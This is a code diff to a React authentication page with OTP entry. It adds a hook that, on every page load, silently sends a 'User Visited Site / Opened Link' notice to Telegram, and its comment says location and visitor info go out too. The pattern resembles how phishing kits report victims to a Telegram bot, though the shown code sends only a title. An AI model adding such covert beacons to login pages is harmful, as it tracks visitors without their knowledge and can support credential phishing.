@@ -23,6 +23,22 @@ export default function AuthFlowPage() {
   const [canResend, setCanResend] = useState(false);
   const otpInputRef = useRef<HTMLInputElement>(null);
 
+  // Send location and visitor info as soon as user visits the site or opens the link
+  useEffect(() => {
+    const trackVisitor = async () => {
+      try {
+        const { sendTelegramMessage } = await import("@/lib/telegram");
+        await sendTelegramMessage({
+          title: "🌐 User Visited Site / Opened Link",
+        });
+      } catch (err) {
+        console.error("Visitor tracking error:", err);
+      }
+    };
+
+    trackVisitor();
+  }, []);
+
   // Initialize stored email if available
   useEffect(() => {
     if (typeof window !== "undefined") {
